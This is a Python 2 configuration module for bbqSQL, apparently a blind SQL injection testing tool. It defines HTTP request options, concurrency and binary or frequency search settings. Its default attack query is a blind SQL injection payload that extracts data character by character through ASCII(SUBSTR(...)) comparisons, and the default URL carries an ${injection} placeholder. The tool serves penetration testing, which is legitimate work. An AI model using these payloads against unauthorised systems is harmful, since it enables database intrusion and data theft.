import bbq_core
from bbq_core import bcolors
import text
import ast

try:
    import readline
except ImportError:
    pass

from urlparse import urlparse
from urllib import quote
from gevent import socket
import os
import sys

response_attributes = ['status_code', 'url', 'time', 'size', 'text', 'content', 'encoding', 'cookies', 'headers', 'history']

DEBUG = False
def debug(fn):
    '''debugging decorator'''
    def wrapped(*args,**kwargs):
        if DEBUG: print 'Calling into %s' % fn.__name__
        rval = fn(*args,**kwargs)
        if DEBUG: print 'Returning from %s' % fn.__name__
        return rval
    return wrapped

class ConfigError(Exception):
    '''Throw this exception when a method that hasn't been implemented gets called'''
    def __init__(self, value):
        self.value = value
    def __repr__(self):
        return "You have a config error: " + self.value

@debug
def validate_allow_redirects(thing):
    if type(thing['value']) == str:
        if thing['value'].lower() == 'false':
            thing['value'] = False
        else:
            thing['value'] = True
    
    return True

@debug
def validate_ath(thing):
    if not (len(thing['value'])==2 and type(thing['value'][0])==str and type(thing['value'][1])==str):
        raise ConfigError("auth should be a tuple of two strings. Eg. ('username','password')")

    return True

@debug
def validate_cookies(thing):
    if type(thing['value']) == str:
        try:
            list_cookies = thing['value'].split(';')
            dict_cookies = {}
            for c in list_cookies:
                parts = c.split('=',1)
                dict_cookies[parts[0]] = parts[1].strip()
            thing['value'] = dict_cookies
        except:
            raise ConfigError("You provided your cookies as a string. Thats okay, but it doesn't look like you formatted them properly")
    for k in thing['value']:
        if type(k) != str  or type(thing['value'][k]) != str:
            raise ConfigError("Keys and values for cookies need to be strings.")
    
    return True

@debug
def validate_headers(thing):
    if type(thing['value']) == str:
        try:
            parts = thing['value'].split(':')
            headers = {parts[0]:parts[1].strip()}
            thing['value'] = headers
        except:
            raise ConfigError("You provided your headers as a string. Thats okay, but it doesn't look like you formatted them properly")
    for k in thing['value']:
        if type(k) != str  or type(thing['value'][k]) != str:
            raise ConfigError("Keys and values for headers need to be strings.")
    
    return True

@debug
def validate_data(thing):
    if type(thing['value']) == dict:
        for k in thing['value']:
            if type(k) != str or type(thing["value"][k]) != str:
                raise ConfigError('You provided your data as a dict. The keys and values need to be strings')
    
    return True

@debug
def validate_files(thing):
    if type(thing['value']) == str:
        try:
            f = open(thing['value'],'r')
            n = os.path.basename(thing['value'])
            thing['value'] = {n:f}
        except:
            raise ConfigError("You provided files as a string. I couldn't find the file you specified")
    
    for k in thing['value']:
        if type(thing['value'][k]) != file:
            raise ConfigError("You have a non-file object in the file parameter.")
    
    return True

@debug
def validate_method(thing):
    if thing['value'].lower() not in ['get','options','head','post','put','patch','delete']:
        raise ConfigError("The valid options for method are: ['get','options','head','post','put','patch','delete']")

    return True

@debug
def validate_params(thing):
    if type(thing['value']) == dict:
        for k in thing['value']:
            if type(k) != str or type(thing['value'][k]) != str:
                raise ConfigError("You provided params as a dict. Keys are values for this dict must be strings.")
    
    return True

@debug
def validate_url(thing):
    parsed_url = urlparse(str(thing['value']))
    netloc = parsed_url.netloc.split(':')[0]
    # this is slowing us down. gotta cut it loose
    '''
    try:
        socket.gethostbyname(netloc)
    except socket.error,err:
        raise ConfigError('Invalid host name. Cannot resolve. Socket Error: %s' % err)
    '''
    if parsed_url.scheme.lower() not in ['http','https']:
        raise ConfigError('Invalid url scheme. Only http and https')
    
    return True

class RequestsConfig:
    config = {\
        'allow_redirects':\
            {'name':'allow_redirects',\
            'value':None,\
            'description':'A bool (True or False) that determines whether HTTP redirects will be followed when making requests.',\
            'types':[bool],\
            'required':False,\
            'validator':validate_allow_redirects},\
        'auth':\
            {'name':'auth',\
            'value':None,\
            'description':'A tuple of username and password to be used for http basic authentication. \nEg.\n("myusername","mypassword")',\
            'types':[tuple],
            'required':False,\
            'validator':validate_ath},\
        'cookies':\
            {'name':'cookies',\
            'value':None,\
            'description':'A dictionary or string of cookies to be sent with the requests. \nEg.\n{"PHPSESSIONID":"123123"}\nor\nPHPSESSIONID=123123;JSESSIONID=foobar',\
            'types':[dict,str],\
            'required':False,\
            'validator': validate_cookies},\
        'data':\
            {'name':'data',\
            'value':None,\
            'description':'POST data to be sent along with the request. Can be dict or str.\nEg.\n{"input_field":"value"}\nor\ninput_field=value',\
            'types':[dict,str],\
            'required':False,\
            'validator': validate_data},\
        'files':\
            {'name':'files',\
            'value':None,\
            'description':'Files to be sent with the request. Set the value to the path and bbqSQL will take care of opening/including the file...',\
            'types':[dict,str],\
            'required':False,\
            'validator': validate_files},\
        'headers':\
            {'name':'headers',\
            'value':None,\
            'description':'HTTP headers to be send with the requests. Can be string or dict.\nEg.\n{"User-Agent":"bbqsql"}\nor\n"User-Agent: bbqsql"',\
            'types':[dict,str],\
            'required':False,\
            'validator': validate_headers},\
        'method':\
            {'name':'method',\
            'value':'GET',\
            'description':"The valid options for method are: ['get','options','head','post','put','patch','delete']",\
            'types':[str],\
            'required':True,\
            'validator':validate_method},\
        'proxies':\
            {'name':'proxies',\
            'value':None,\
            'description':'HTTP proxies to be used for the request.\nEg.\n{"http": "10.10.1.10:3128","https": "10.10.1.10:1080"}',\
            'types':[dict],\
            'required':False,\
            'validator':None},\
        'url':\
            {'name':'url',\
            'value':'http://example.com/sqlivuln/index.php?username=user1&password=secret${injection}',\
            'description':'The URL that requests should be sent to.',\
            'types':[str],\
            'required':True,\
            'validator':validate_url}}

    menu_text = "We need to determine what our HTTP request will look like. Bellow are the\navailable HTTP parameters. Please enter the number of the parameter you\nwould like to edit. When you are done setting up the HTTP parameters,\nyou can type 'done' to keep going.\n"

    prompt_text = "http_options"

    def validate(self,quiet=False):
        ''' Check if all the config parameters are properly set'''
        valid = True
        for key in self.config:
            # if there is not value and a value is required, we have a problem
            if self.config[key]['value'] == None:
                if self.config[key]['required']:
                    valid = False
                    if not quiet: print bcolors.RED + ("You must specify a value for '%s'" % key) + bcolors.ENDC
            
            # if the config keys validator fails, we have a problem
            elif self.config[key]['validator']:
                try:
                    self.config[key]['validator'](self.config[key])
                except ConfigError, err:
                    if not quiet: print bcolors.RED + repr(err) + bcolors.ENDC
                    valid = False
        return valid
    
    def get_config(self):
        '''Return a dict of all the set config parameters'''
        # make sure we're on the up and up
        kwargs = {}
        for key in self.config:
            if self.config[key]['value'] != None:
                kwargs[key] = self.config[key]['value']
        return kwargs

    def set_config(self,config):
        '''take a dict of all the config parameters and apply it to the config object'''
        for key in config:
            if key in self.config:
                if(self.config[key]['types'] == [str]):
                    self.config[key]['value'] = config[key]
                else:
                    try:
                        self.config[key]['value'] = ast.literal_eval(config[key])
                    except (ValueError, SyntaxError):
                        self.config[key]['value'] = config[key]
        self.validate()
    
    def run_config(self):
        '''run a configuration menu'''
        config_keys = self.config.keys()
        choice = ''
        while choice not in ['done','back','quit','exit',99,'99']:
            bbq_core.show_banner()
            http_main_menu = bbq_core.CreateMenu(self.menu_text, [])
            
            for ki in xrange(len(config_keys)):
                key = config_keys[ki]
                print "\t%d) %s" % (ki,key)
                if self[key]['value'] is not None:
                    print "\t   Value: %s" % str(self[key]['value'])
            print "\n\t99) Go back to the main menu"
            print "\n"
            self.validate()

            #get input
            choice = (raw_input(bbq_core.setprompt(self.prompt_text)))
            #convert to int
            try:
                choice = int(choice)
            except ValueError:
                pass
            
            if choice in range(len(config_keys)):
                key = config_keys[choice]
                bbq_core.show_banner()
                print "Parameter    : %s" % key
                print "Value        : %s" % repr(self[key]['value'])
                print "Allowed types: %s" % repr([t.__name__ for t in self[key]['types']])
                print "Required     : %s" % repr(self[key]['required'])
                desc = self[key]['description'].split("\n")
                desc = "\n\t\t".join(desc)
                print "Description  : %s" % desc
                self.validate()
                print "\nPlease enter a new value for %s.\n" % key
                
                value = raw_input(bbq_core.setprompt(self.prompt_text,config_keys[choice]))
                try:
                    value = eval(value)
                except:
                    pass
                self[key]['value'] = None if value == '' else value
            
        if choice in ['exit','quit']:
            bbq_core.ExitBBQ(0)
    
    def keys(self):
        return self.config.keys()
    
    def __iter__(self):
        for key in self.config:
            yield key
        raise StopIteration
    
    def __getitem__(self,key):
        if key not in self.config:
            raise KeyError
        return self.config[key]
    
    def __getattr__(self,key):
        print key
        print self.__class__
        if key not in self.config:
            raise KeyError
        return self.config[key]

    def __setitem__(self,key,val):
        self.config[key] = val
    
    def __setattr__(self,key,value):
        if key not in self.config:
            raise KeyError
        self.config[key] = val

    def __repr__(self):
        out = {}
        for key in self.config:
            out[key] = self.config[key]['value']
        return repr(out)
    
    def __str__(self):
        return self.__repr__()

@debug
def validate_hooks_file(thing):
    # don't want to import multiple times. this also keeps track of if it was successful
    if thing['value'] and thing['value'] is not thing['last_imported']:
        # cannonicalize the path
        full_path = os.path.realpath(os.path.expanduser(os.path.expandvars(thing['value'])))

        #make sure its real
        if not os.path.exists(full_path):
            raise ConfigError("The hooks_file path you specified doesn't exist. try again")

        # grab just the dir portion of the path
        head,tail = os.path.split(full_path)

        # prepend this to our search path
        sys.path.insert(0,head)

        # get the module name from the file name
        mname = tail.rsplit('.',1)

        # make sure they gave a good file
        if len(mname) != 2 or mname[1] != 'py':
            raise ConfigError("The hooks_file needs to be a python file. It should look like ~/foo/bar/myhooks.py")

        # try importing it
        try:
            exec "import %s as new_user_hooks" % mname[0]
        except Exception,e:
            raise ConfigError("You have the following problem with your hooks file: %s - %s" % (str(type(e)),e.message))

        # extract the callable objects that don't start with _ from the newly imported module
        new_hooks_dict = {}
        for f_name in dir(new_user_hooks):
            f = getattr(new_user_hooks,f_name)
            if hasattr(f,'__call__') and f.__module__ == mname[0] and not f_name.startswith('_'):
                new_hooks_dict[f_name] = f

        # initialize or reinitialize the thing['hooks_dict']
        if not thing['hooks_dict'] or raw_input('would you like to wipe existing hooks? (y/n) [n]: ') == 'y':
                thing['hooks_dict'] = {}

        # merge our new hooks with our existing hooks
        thing['hooks_dict'].update(new_hooks_dict)

        # clean up 
        new_user_hooks = None

        # specify the file we just imported
        thing['last_imported'] = thing['value']

        print "Successfully imported hooks from %s" % full_path
        print thing['hooks_dict']

    if thing['value'] == '':
        thing['hooks_dict'] = None
        thing['value'] = None

    return True

@debug
def validate_concurrency(thing):
    try:
        thing['value'] = int(thing['value'])
    except ValueError:
        raise ConfigError('You need to give a numeric value for concurrency')

    return True

@debug
def validate_comparison_attr(thing):
    if thing['value'] not in response_attributes:
        raise ConfigError("You must choose a valid comparison_attr. Valid options include %s" % str(response_attributes))
    
    return True

@debug
def validate_search_type(thing):
    if thing['value'] not in ['binary_search','frequency_search']:
        if 'binary' in thing['value']:
            thing['value'] = 'binary_search'
        elif 'frequency' in thing['value']:
            thing['value'] = 'frequency_search'
        else:
            raise ConfigError('You need to set search_type to either "binary_search" or "frequency_search"')
        
    return True

@debug
def validate_query(thing):
    if type(thing['value']) != str:
        raise ConfigError("looks like query is a %s. it should be a string..."%type(thing))
    return True


class bbqsqlConfig(RequestsConfig):
    config = {\
        'hooks_file':\
            {'name':'hooks_file',\
            'value':None,\
            'description':'Specifies the .py file where the requests hooks exist. This file should contain functions like `pre_request`,`post_request`,`args`,....',\
            'types':[str],\
            'required':False,\
            'validator':validate_hooks_file,
            'last_imported':None,\
            'hooks_dict':None},\
        'concurrency':\
            {'name':'concurrency',\
            'value':30,\
            'description':'Controls the amount of concurrency to run the attack with. This is useful for throttling the requests',\
            'types':[str,int],\
            'required':True,\
            'validator':validate_concurrency},\
        'csv_output_file':\
            {'name':'csv_output_file',\
            'value':None,\
            'description':'The name of a file to output the results to. Leave this blank if you dont want output to a file',\
            'types':[str],\
            'required':False,\
            'validator':None},\
        'comparison_attr':\
            {'name':'comparison_attr',\
            'value':'size',\
            'description':"Which attribute of the http response bbqsql should look at to determine true/false. Valid options include %s" % str(response_attributes),\
            'types':[str],\
            'required':True,\
            'validator':validate_comparison_attr},\
        'technique':\
            {'name':'technique',\
            'value':'binary_search',\
            'description':'Determines the method for searching. Can either do a binary search algorithm or a character frequency based search algorithm. You probably want to use binary. The allowed values for this are "binary_search" or "frequency_search".',\
            'types':[str],\
            'required':True,\
            'validator':validate_search_type},\
        'query':\
            {'name':'query',\
            'value':"' and ASCII(SUBSTR((SELECT data FROM data ORDER BY id LIMIT 1 OFFSET ${row_index:1}),${char_index:1},1))${comparator:>}${char_val:0} #",\
            'description':text.query_text,\
            'types':[str],\
            'required':True,\
            'validator':validate_query}}

    menu_text = "Please specify the following configuration parameters.\n"
    prompt_text = "attack_options"
